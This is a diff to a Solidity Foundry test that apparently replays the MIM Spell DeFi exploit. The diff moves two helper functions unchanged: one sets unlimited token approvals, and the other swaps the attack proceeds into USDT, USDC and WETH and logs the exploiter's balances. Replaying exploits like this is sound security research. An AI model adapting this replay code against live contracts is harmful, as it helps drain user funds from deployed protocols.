@@ -47,36 +47,6 @@ contract MIMSpellReplay is Test {
         _postExploit();
     }
 
-    function _setUpApprovals() internal {
-        MIM.approve(address(DegenBox), type(uint256).max);
-        MIM.approve(address(MIM_3LP3CRV), type(uint256).max);
-        USDT.approve(address(USDT_WBTC_WETH), type(uint256).max);
-        Crv3_USD_BTC_ETH.approve(address(yvCurve_3Crypto_f), type(uint256).max);
-        yvCurve_3Crypto_f.approve(address(DegenBox), type(uint256).max);
-    }
-
-    function _postExploit() internal {
-        // Exchange MIM to USDT
-        MIM_3LP3CRV.exchange_underlying(0, 2, 4_300_000 * 1e18, 0);
-
-        // Obtain USDC tokens
-        MIM_USDC.swap(address(this), true, 100_000 * 1e18, 75_212_254_740_446_025_735_711, "");
-
-        // Obtain WETH tokens
-
-        USDC_WETH.swap(
-            address(this),
-            true,
-            int256(USDC.balanceOf(address(this))),
-            1_567_565_235_711_739_205_094_520_276_811_199,
-            ""
-        );
-
-        console.log("\nExploiter MIM balance after attack", MIM.balanceOf(address(this)), MIM.decimals());
-
-        console.log("Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals());
-    }
-
     function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
         external
         returns (bytes32)
@@ -159,6 +129,36 @@ contract MIMSpellReplay is Test {
         // Repaying flashloan
         MIM.transfer(address(DegenBox), amount + fee);
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function _setUpApprovals() internal {
+        MIM.approve(address(DegenBox), type(uint256).max);
+        MIM.approve(address(MIM_3LP3CRV), type(uint256).max);
+        USDT.approve(address(USDT_WBTC_WETH), type(uint256).max);
+        Crv3_USD_BTC_ETH.approve(address(yvCurve_3Crypto_f), type(uint256).max);
+        yvCurve_3Crypto_f.approve(address(DegenBox), type(uint256).max);
+    }
+
+    function _postExploit() internal {
+        // Exchange MIM to USDT
+        MIM_3LP3CRV.exchange_underlying(0, 2, 4_300_000 * 1e18, 0);
+
+        // Obtain USDC tokens
+        MIM_USDC.swap(address(this), true, 100_000 * 1e18, 75_212_254_740_446_025_735_711, "");
+
+        // Obtain WETH tokens
+
+        USDC_WETH.swap(
+            address(this),
+            true,
+            int256(USDC.balanceOf(address(this))),
+            1_567_565_235_711_739_205_094_520_276_811_199,
+            ""
+        );
+
+        console.log("\nExploiter MIM balance after attack", MIM.balanceOf(address(this)), MIM.decimals());
+
+        console.log("Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals());
     }
 
     function _logBorrow() public returns (uint128 elastic, uint128 base) {
